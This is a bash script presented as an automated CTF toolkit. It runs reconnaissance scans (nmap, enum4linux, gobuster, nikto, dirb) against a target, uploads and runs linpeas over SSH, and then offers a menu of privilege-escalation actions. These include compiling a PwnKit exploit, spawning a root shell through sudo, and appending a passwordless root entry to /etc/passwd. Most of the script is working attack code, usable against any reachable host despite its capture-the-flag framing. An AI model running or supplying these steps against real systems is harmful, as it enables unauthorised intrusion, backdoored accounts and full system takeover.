#!/bin/bash

# ASCII Art functions
display_start_art() {
    echo "  ____ _                 _                _    _            _        _  "
    echo " / ___| | ___  _   _  __| | __ _ _ __ ___| | _| | __ _  ___| | __   / \\ "
    echo "| |   | |/ _ \\| | | |/ _\` |/ _\` | '__/ _ \\ |/ / |/ _\` |/ __| |/ /  / _ \\ "
    echo "| |___| | (_) | |_| | (_| | (_| | | |  __/   <| | (_| | (__|   <  / ___ \\"
    echo " \\____|_|\\___/ \\__,_|\\__,_|\\__,_|_|  \\___|_|\\_\\_|\\__,_|\\___|_|\\_\\/_/   \\_\\"
    echo "                          Automated CTF Toolkit"
}

display_nmap_art() {
    echo "  _   _  __  __    _    ____  "
    echo " | \\ | | \\ \\/ /   / \\  |  _ \\ "
    echo " |  \\| |  \\  /   / _ \\ | | | |"
    echo " | |\\  |  /  \\  / ___ \\| |_| |"
    echo " |_| \\_| /_/\\_\\/_/   \\_\\____/ "
    echo "          Nmap Scan"
}

display_enum4linux_art() {
    echo "  _______  __    _  _______  __   __  _______  ___      __   __  _______ "
    echo " |       ||  |  | ||       ||  | |  ||   _   ||   |    |  |_|  ||       |"
    echo " |  _____||   |_| ||    ___||  |_|  ||  |_|  ||   |    |       ||    ___|"
    echo " | |_____ |       ||   |___ |       ||       ||   |    |       ||   |___ "
    echo " |_____  ||  _    ||    ___||       ||       ||   |___ |       ||    ___|"
    echo "  _____| || | |   ||   |___ |   _   ||   _   ||       || ||_|| ||   |___ "
    echo " |_______||_|  |__||_______||__| |__||__| |__||_______||_|   |_||_______|"
    echo "          Enum4linux Scan"
}

display_gobuster_art() {
    echo "   ____       _           _             "
    echo "  / ___|_   _| |__   ___ | |__  _ __ ___"
    echo " | |  _| | | | '_ \\ / _ \\| '_ \\| '__/ _ \\"
    echo " | |_| | |_| | |_) | (_) | |_) | | |  __/"
    echo "  \\____|\\__,_|_.__/ \\___/|_.__/|_|  \\___|"
    echo "          Gobuster Scan"
}

display_nikto_art() {
    echo "  _   _ _ _    _ _______ _______ ______  "
    echo " | \\ | (_) | _| |_   _|  ___|  _  \\|  _ \\ "
    echo " |  \\| | |/ / | | | | | |_  | | | || | | |"
    echo " | . \` |   <| | | | |  _| | |_| || |_| |"
    echo " |_|\\_|_|\\_\\_| |_| |_|   |_| |__\\_\\"
    echo "           Nikto Scan"
}

display_dirb_art() {
    echo "  ____  _ _      "
    echo " |  _ \\(_) |_ ___"
    echo " | | | | | __/ __|"
    echo " | |_| | | |_\\__ \\"
    echo " |____/|_|\\__|___/"
    echo "         Dirb Scan"
}

display_priv_esc_art() {
    echo "  ____       _ _ _                _     "
    echo " |  _ \\ _ __(_) | |__   __ _ _ __ | | __"
    echo " | |_) | '__| | | '_ \\ / _\` | '_ \\| |/ /"
    echo " |  __/| |  | | | |_) | (_| | | | |   < "
    echo " |_|   |_|  |_|_|_.__/ \\__,_|_| |_|_|\\_\\"
    echo "       Privilege Escalation"
}

display_flag_search_art() {
    echo "  _____ _ _       __    "
    echo " |  ___(_) |_ ___|  \\   "
    echo " | |_  | | __/ _ \\  _ \\ "
    echo " |  _| | | ||  __/ | \\ \\"
    echo " |_|   |_|\\__\\___|_|  |_|"
    echo "       Flag Search"
}

# Usage function
usage() {
    echo "Usage: $0 -t <target_ip> -l <local_ip> [-k <ssh_key>]"
    exit 1
}

# Check for required tools
check_tools() {
    for tool in nmap nc ssh scp enum4linux gobuster nikto dirb; do
        if ! command -v $tool &> /dev/null; then
            echo "[!] $tool is required but not installed. Please install it and try again."
            exit 1
        fi
    done
}

# Run nmap scan
nmap_scan() {
    display_nmap_art
    echo "[*] Running nmap scan on $TARGET_IP..."
    nmap -A -T4 $TARGET_IP -oN nmap_scan.txt
    echo "[*] Nmap scan saved to nmap_scan.txt"
}

# Run enum4linux scan
enum4linux_scan() {
    display_enum4linux_art
    echo "[*] Running enum4linux scan on $TARGET_IP..."
    enum4linux -a $TARGET_IP > enum4linux.txt
    echo "[*] Enum4linux scan saved to enum4linux.txt"
}

# Run gobuster scan
gobuster_scan() {
    display_gobuster_art
    echo "[*] Running gobuster scan on $TARGET_IP..."
    gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_scan.txt
    echo "[*] Gobuster scan saved to gobuster_scan.txt"
}

# Run nikto scan
nikto_scan() {
    display_nikto_art
    echo "[*] Running nikto scan on $TARGET_IP..."
    nikto -h http://$TARGET_IP -o nikto_scan.txt
    echo "[*] Nikto scan saved to nikto_scan.txt"
}

# Run dirb scan
dirb_scan() {
    display_dirb_art
    echo "[*] Running dirb scan on $TARGET_IP..."
    dirb http://$TARGET_IP /usr/share/wordlists/dirb/common.txt -o dirb_scan.txt
    echo "[*] Dirb scan saved to dirb_scan.txt"
}

# Check for open ports
check_ports() {
    echo "[*] Checking for open ports..."
    OPEN_PORTS=$(grep open nmap_scan.txt | cut -d '/' -f 1)
    for port in $OPEN_PORTS; do
        echo "[*] Trying to connect to port $port..."
        nc -zv $TARGET_IP $port
        if [ $? -eq 0 ]; then
            echo "[*] Connected to $TARGET_IP on port $port"
        else
            echo "[!] Could not connect to $TARGET_IP on port $port"
        fi
    done
}

# Extract potential privilege escalation exploits
extract_exploits() {
    echo "[*] Extracting potential privilege escalation exploits..."
    grep -E "CVE|exploit|interesting" linpeas_output.txt > potential_exploits.txt
    if [ -s potential_exploits.txt ]; then
        echo "[*] Potential exploits saved to potential_exploits.txt"
    else
        echo "[!] No potential exploits found."
    fi
}

# Interactive menu for privilege escalation
exploit_menu() {
    echo "[*] Please review the potential exploits and choose one to attempt:"
    select exploit in $(cat potential_exploits.txt); do
        if [[ -n $exploit ]]; then
            echo "[*] You chose: $exploit"
            echo "[*] Attempting to exploit: $exploit"
            attempt_exploit "$exploit"
            break
        else
            echo "[!] Invalid choice. Please select a valid exploit."
        fi
    done
}

# Attempt to exploit the chosen vector
attempt_exploit() {
    local exploit=$1
    echo "[*] Executing exploit: $exploit"
    case "$exploit" in
        *"CVE-2021-4034"*)
            ssh -i $SSH_KEY $TARGET_IP 'gcc /path/to/pwnkit.c -o /tmp/pwnkit && /tmp/pwnkit'
            ;;
        *"SUID binary found: /usr/bin/sudo"*)
            ssh -i $SSH_KEY $TARGET_IP 'sudo -u root /bin/bash'
            ;;
        *"Interesting file with write permissions: /etc/passwd"*)
            ssh -i $SSH_KEY $TARGET_IP 'echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd'
            ;;
        *)
            echo "[!] No predefined action for this exploit. Please execute it manually."
            ;;
    esac
    echo "[*] Verifying privilege escalation..."
    ssh -i $SSH_KEY $TARGET_IP 'whoami'
}

# Privilege Escalation
privilege_escalation() {
    display_priv_esc_art
    echo "[*] Starting privilege escalation checks..."
    echo "[*] Uploading linpeas.sh to the target machine..."
    scp -i $SSH_KEY linpeas.sh $TARGET_IP:/tmp/linpeas.sh
    echo "[*] Running linpeas.sh on the target machine..."
    ssh -i $SSH_KEY $TARGET_IP 'chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh > /tmp/linpeas_output.txt'
    echo "[*] Linpeas output saved to /tmp/linpeas_output.txt on the target machine."
    echo "[*] Downloading linpeas output from the target machine..."
    scp -i $SSH_KEY $TARGET_IP:/tmp/linpeas_output.txt linpeas_output.txt
    echo "[*] Linpeas output saved to linpeas_output.txt on the local machine."

    extract_exploits
    if [ -s potential_exploits.txt ]; then
        exploit_menu
    else
        echo "[!] No exploits to attempt."
    fi
}

# Search for flag files
search_flag() {
    display_flag_search_art
    echo "[*] Searching for flag files on the target machine..."
    ssh -i $SSH_KEY $TARGET_IP 'find / -name "flag.txt" 2>/dev/null' > flag_locations.txt
    echo "[*] Flag file locations saved to flag_locations.txt"
}

# Parse arguments
while getopts ":t:l:k:" opt; do
    case $opt in
        t)
            TARGET_IP=$OPTARG
            ;;
        l)
            LOCAL_IP=$OPTARG
            ;;
        k)
            SSH_KEY=$OPTARG
            ;;
        *)
            usage
            ;;
    esac
done

# Check if required arguments are provided
if [ -z "$TARGET_IP" ] || [ -z "$LOCAL_IP" ]; then
    usage
fi

# Display start art
display_start_art

# Check for required tools
check_tools

# Run the functions
nmap_scan
enum4linux_scan
gobuster_scan
nikto_scan
dirb_scan
check_ports
privilege_escalation
search_flag

echo "[*] All tasks completed."